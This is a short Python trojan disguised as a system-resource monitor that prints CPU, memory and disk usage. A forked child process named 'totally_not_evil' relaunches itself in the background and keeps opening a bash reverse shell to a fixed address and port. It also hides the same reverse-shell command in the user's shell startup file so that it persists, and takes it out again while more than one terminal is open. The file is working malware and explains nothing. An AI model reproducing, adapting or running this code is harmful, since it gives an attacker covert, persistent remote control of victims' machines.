import os
import psutil
import time
import signal
import sys
from contextlib import contextmanager,redirect_stderr,redirect_stdout
CCPORT="9001"
CCIP="192.168.0.67"
def get_system_info():
	# Get CPU usage percentage
	cpu_percent = psutil.cpu_percent(interval=None)

	# Get memory usage information
	mem = psutil.virtual_memory()
	total_memory = mem.total
	used_memory = mem.used
	memory_percent = mem.percent

	# Get disk usage information
	disk = psutil.disk_usage('/')
	total_disk_space = disk.total
	used_disk_space = disk.used
	disk_space_percent = disk.percent

	# Print system information
	print("=" * 40)
	print(f"CPU Usage: {cpu_percent}%")
	print(f"Memory Usage: Total: {total_memory}B, Used: {used_memory}B, {memory_percent}%")
	print(f"Disk Usage: Total: {total_disk_space}B, Used: {used_disk_space}B, {disk_space_percent}%")
	print("=" * 40)

def totally_not_evil():
	pid = os.getpid()
	testing=str(os.popen("realpath /proc/"+str(pid)+"/fd/0").read()).strip()
	print(str(os.popen("realpath /proc/"+str(pid)+"/fd/0").read()).strip())
	if testing=="/dev/null":
		os.system("touch /home/platinum/projects/trojan_horse/here")
	else:
		# print("We are in python")
		os.system("nohup python3 /home/platinum/projects/trojan_horse/trojan.py > /dev/null 2>&1")
		sys.exit()
	shell = os.environ["SHELL"].split("/")[3]
	cmd = '"bash -i >& /dev/tcp/192.168.0.67/9001 0>&1 &" 2>/dev/null'
	is_added=False
	while True:
		# bash -c "bash -i >& /dev/tcp/192.168.0.67/9001 0>&1 &" 2>/dev/null
		time.sleep(3)
		test = os.popen("ls /dev/pts/  | wc -l").read()
		username = str(os.popen("whoami").read()).strip()
		os.system('bash -c "bash -i >& /dev/tcp/192.168.0.67/9001 0>&1 &" 2>/dev/null')
		if int(test.strip()) > 1:
			shell2 = str("/home/"+username+"/.{}rc".format(shell)).strip()
			# print(shell2)
			with open(shell2, "r") as f:
				data=str(f.read())
				f.close()
				tocheck='bash -c "bash -i >& /dev/tcp/192.168.0.67/9001 0>&1 &" 2>/dev/null\n'
				if tocheck in data:
					data = data.replace(tocheck, "")
					is_added=False
			with open(shell2, "w") as f:
				f.write(data)
				f.close()
		else:
			if not is_added:
				os.system("echo 'bash -c {}' >> ~/.{}rc 2>/dev/null".format(cmd,shell))
				is_added=True


if __name__ == "__main__":
	pid = os.fork()
	if pid == 0:
		# Child process (pid is 0)
		totally_not_evil()
	else:
		# Parent process (pid is greater than 0)
		get_system_info()
	
# nohup python3 trojan.py > /dev/null 2>&1

